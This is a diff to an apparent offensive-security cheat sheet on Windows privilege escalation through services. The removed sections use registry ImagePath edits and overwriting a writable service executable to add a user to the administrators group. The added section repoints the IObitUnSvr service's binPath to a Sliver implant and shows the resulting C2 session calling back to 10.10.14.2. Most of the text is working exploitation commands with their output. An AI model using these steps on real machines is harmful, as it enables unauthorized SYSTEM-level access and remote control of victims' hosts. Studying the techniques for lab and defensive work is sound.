@@ -318,70 +318,34 @@ Windows VM
 msiexec /quiet /qn /i C:\Temp\setup.msi
 ```
 
-### Service Escalation The Registry
+### Service Escalation via Changing binpath
 
-* Detection
-* Windows VM
-* Open powershell prompt and type:
+* Query the interesting service
 
 ```
-Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+sc.exe qc IObitUnSvr
+SERVICE_NAME: IObitUnSvr
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : 
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : IObit Uninstaller Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
 ```
 
-* Notice that the output suggests that user belong to `NT AUTHORITY\INTERACTIVE` has `FullContol` permission over the registry key.
-* Exploitation
-* Windows VM
-* Copy `C:\Users\User\Desktop\Tools\Source\windows_service.c` to the Kali VM.
-
-Kali VM
-
-* Open windows\_service.c in a text editor and replace the command used by the `system()` function to: `cmd.exe /k net localgroup administrators user /add`
-* Exit the text editor and compile the file by typing the following in the command prompt:
+* You notice that you cannot swap out the legit exe, or modify the directory the exe is in, however you can edit the binpath
 
 ```
-x86_64-w64-mingw32-gcc windows_service.c -o x.exe 
+sc.exe config IObitUnSvr binPath= "C:\Users\dharding\Desktop\sliver.exe"
+[SC] ChangeServiceConfig SUCCESS
+PS C:\Windows\System32\spool\drivers\color> sc.exe start IObitUnSvr
+sc.exe start IObitUnSvr
+# get session
+[*] Session 12b37889 dante-dc01 - 10.10.14.2:52042 (LOCAL-WS02) - windows/amd64 - Tue, 07 May 2024 18:18:15 EDT
 ```
-
-* (NOTE: if this is not installed, use `sudo apt install gcc-mingw-w64`)
-* Copy the generated file `x.exe`, to the Windows VM.
-
-Windows VM
-
-* Place `x.exe` in `C:\Temp`.
-* Open command prompt at type:
-
-```
-reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
-```
-
-* In the command prompt type: `sc start regsvc`
-* It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt:
-
-```
-net localgroup administrators
-```
-
-### Service Escalation Executable Files
-
-* Detection
-* Windows VM
-* Open command prompt and type:
-
-```
-C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
-```
-
-* Notice that the `Everyone` user group has `FILE_ALL_ACCESS` permission on the filepermservice.exe file.
-* Exploitation
-* Windows VM
-* Open command prompt and type:
-
-```
-copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
-```
-
-* In command prompt type: `sc start filepermsvc`
-* It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`
 
 ### Startup Applications
 
